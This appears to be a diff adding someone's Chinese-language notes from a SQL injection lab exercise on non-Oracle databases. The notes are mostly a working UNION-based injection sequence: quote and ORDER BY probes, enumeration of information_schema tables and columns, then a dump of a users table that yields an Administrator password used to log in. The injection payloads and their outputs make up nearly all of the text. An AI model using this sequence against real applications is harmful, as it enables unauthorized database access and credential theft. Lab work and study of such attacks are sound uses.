@@ -1,0 +1,26 @@
+SQL 注入攻击，在非 Oracle 数据库中列出数据库内容:
+
+'
+'--
+' Or 1=1--
+' Order by 3-- >> error
+' Order by 2-- >> ok
+' Union select null, null-- >> ok
+' Union select 'a', null-- >> ok
+' Union select 'a', 'b'-- >> ok
+' Union select table_name, null from information_schema.tables--
+>> 爆库
+>> ctrl+f 搜索 uers关键信息
+>> users_iajrny
+' Union select column_name, null from information_schema.columns where
+Table_name = 'users_iajrny'--
+>>get
+username_gdpzbz
+password_ofyevt
+>>
+' Union select username_gdpzbz, password_ofyevt from users_iajrny--
+>>get
+Administrator
+bg2kt4xvgqwbsc33lt1c
+>>
+>>login and success.
